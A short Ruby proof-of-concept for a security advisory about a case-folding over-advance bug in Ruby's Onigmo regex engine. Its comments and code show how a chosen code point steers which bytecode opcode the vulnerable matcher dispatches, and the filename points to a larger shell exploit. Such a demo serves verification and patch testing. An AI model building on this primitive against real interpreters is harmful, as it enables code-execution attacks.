#!/usr/bin/env ruby
# GHSA-wpqw-5qxg-m68r: demonstrate that the byte consumed by the
# OP_EXACT1_IC over-advance is attacker-chosen pattern bytecode.
# Compiled UTF-16LE shape for "(?i:w)" + U+XX03 + "AB":
#   ... 0e 77 00 | 0a 03 XX 41 00 42 00 | 01 ...
#        opcode  'w'     tail group (3 MB2 chars)   OP_END
# ONIGENC_MBC_CASE_FOLD(U+1E98) yields w + U+030A (bytes 77 00 0a 03), so the
# vulnerable matcher's 4-byte advance lands on the HIGH BYTE of the first tail
# codepoint. The low byte must be 0x03 for the folded bytes to compare equal;
# choosing the high byte therefore chooses the dispatched opcode index.
# Usage: ruby ruby2shell-wpqw-steer.rb INDEX (0x00..0xff)
# Prints one line: good (correct subject) and bad (U+1E98 subject) match flags.
# Vulnerable 3.4.12: idx=0x01 dispatches OP_END -> bad=true (false match).
# Fixed 3.4.13: bad=false for every index. Never leave the lab.
$stdout.sync = true
enc = Encoding::UTF_16LE
idx = Integer(ARGV.fetch(0)) & 0xff
cp  = (idx << 8) | 0x03
tail = [cp].pack('U') + "AB"
begin
  re = Regexp.new(("(?i:w)" + tail).encode(enc))
rescue RegexpError => e
  puts "idx=0x%02x cp=U+%04X compile-error=%s" % [idx, cp, e.message]
  exit 0
end
good = ("w" + tail).encode(enc)
bad  = ("\u1E98" + tail).encode(enc)
puts "idx=0x%02x cp=U+%04X good=%s bad=%s" %
     [idx, cp, re.match?(good), re.match?(bad)]
